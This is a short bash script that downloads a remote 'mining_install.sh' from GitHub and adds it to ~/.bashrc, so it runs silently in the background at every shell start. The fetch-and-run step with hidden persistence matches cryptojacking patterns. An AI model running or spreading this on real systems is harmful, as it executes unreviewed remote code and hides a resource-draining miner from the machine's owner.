#!/bin/bash

curl -sSL https://raw.githubusercontent.com/phambaonam/nexus/main/mining_install.sh -o mining_install.sh && sudo chmod +x ./mining_install.sh

if ! grep -Fxq 'bash "$HOME/mining_install.sh" &>/dev/null &' ~/.bashrc; then
    echo 'bash "$HOME/mining_install.sh" &>/dev/null &' >> ~/.bashrc
    source ~/.bashrc
else
    echo "mining_install.sh already exists in ~/.bashrc"
fi